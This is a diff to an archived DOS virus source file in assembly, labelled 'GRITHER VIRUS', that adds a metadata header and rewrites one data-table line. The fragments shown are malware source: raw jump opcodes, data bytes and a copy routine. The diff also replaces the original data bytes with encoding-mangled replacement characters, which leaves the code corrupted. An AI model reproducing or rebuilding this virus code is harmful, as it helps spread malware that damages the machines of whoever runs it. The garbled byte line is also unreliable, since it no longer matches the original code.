@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      G
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 
 ;**************************************************************************
 ;**                          GRITHER VIRUS                               **
@@ -26,7 +37,7 @@ start:
 ;*		jmp	short loc_1		;*(0112)
 		db	0EBh, 10h
 		db	90h
-data_5		db	'Qº', 9, 3, 'ü‹òÆ'	; Data table (indexed access)
+data_5		db	'ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Qï¿½', 9, 3, 'ï¿½ï¿½ï¿½ï¿½'	; Data table (indexed access)
 		db	0Ah, 0
 		db	0BFh, 0, 1, 0B9h, 3, 0
 		db	0F3h, 0A4h, 8Bh, 0F2h, 0B4h, 30h
